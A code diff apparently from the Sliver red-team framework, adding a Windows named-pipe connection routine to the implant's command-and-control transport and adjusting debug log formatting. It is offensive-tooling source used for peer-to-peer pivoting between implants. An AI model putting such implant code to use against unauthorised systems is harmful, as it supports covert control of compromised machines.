@@ -1,3 +1,5 @@
+//go:build windows
+
 package transports
 
 /*
@@ -23,15 +25,18 @@ package transports
 import (
 	"bytes"
 	"encoding/binary"
+	"io"
 	"net"
 	"net/url"
 	"strings"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/lesnuages/go-winio"
 	"google.golang.org/protobuf/proto"
 )
@@ -40,6 +45,61 @@ const (
 	readBufSizeNamedPipe  = 1024
 	writeBufSizeNamedPipe = 1024
 )
+
+func namedPipeConnect(uri *url.URL) (*Connection, error) {
+	conn, err := namePipeDial(uri)
+	if err != nil {
+		return nil, err
+	}
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			namedPipeWriteEnvelope(&conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := namedPipeReadEnvelope(&conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	activeConnection = connection
+	return connection, nil
+}
 
 func namePipeDial(uri *url.URL) (net.Conn, error) {
 	address := uri.String()
@@ -64,7 +124,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	_, err = (*conn).Write(dataLengthBuf.Bytes())
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[namedpipe] Error %v and %d\n", err, dataLengthBuf)
+		log.Printf("[namedpipe] Error %s and %d\n", err, dataLengthBuf)
 		// {{end}}
 	}
 	totalWritten := 0
@@ -73,7 +133,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		totalWritten += n
 		if err2 != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] Error %v\n", err)
+			log.Printf("[namedpipe] Error %s\n", err)
 			// {{end}}
 		}
 	}
@@ -82,7 +142,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] Error %v\n", err)
+			log.Printf("[namedpipe] Error %s", err)
 			// {{end}}
 		}
 	}
@@ -94,7 +154,7 @@ func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	_, err := (*conn).Read(dataLengthBuf)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[namedpipe] Error (read msg-length): %v\n", err)
+		log.Printf("[namedpipe] Error (read msg-length): %s", err)
 		// {{end}}
 		return nil, err
 	}
@@ -120,7 +180,7 @@ func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[namedpipe] Unmarshaling envelope error: %v", err)
+		log.Printf("[namedpipe] Unmarshal envelope error: %s", err)
 		// {{end}}
 		return &sliverpb.Envelope{}, err
 	}
